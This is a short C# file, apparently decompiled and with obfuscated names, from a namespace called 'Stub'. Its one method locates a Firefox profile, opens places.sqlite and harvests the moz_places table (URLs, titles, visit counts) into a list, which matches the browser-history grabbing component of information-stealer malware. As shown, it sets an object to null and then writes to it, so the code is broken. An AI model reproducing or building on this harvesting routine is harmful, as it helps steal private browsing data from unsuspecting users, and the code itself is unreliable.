using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200000E RID: 14
	public class Class17
	{
		// Token: 0x06000021 RID: 33 RVA: 0x00002E40 File Offset: 0x00001040
		public static List<Program> smethod_0(string String_0)
		{
			List<Program> list = new List<Program>();
			string text = Class26.smethod_2(String_0);
			if (text == null)
			{
				return list;
			}
			Class27 @class = Class27.smethod_1(Path.Combine(text, "places.sqlite"), "moz_places");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Program program = null;
				program.String_0 = GClass4.smethod_4(@class.method_0(i, 1));
				program.String_1 = GClass4.smethod_4(@class.method_0(i, 2));
				program.Int32_0 = Convert.ToInt32(@class.method_0(i, 4)) + 1;
				if (program.String_1 != "0")
				{
					list.Add(program);
				}
			}
			return list;
		}
	}
}
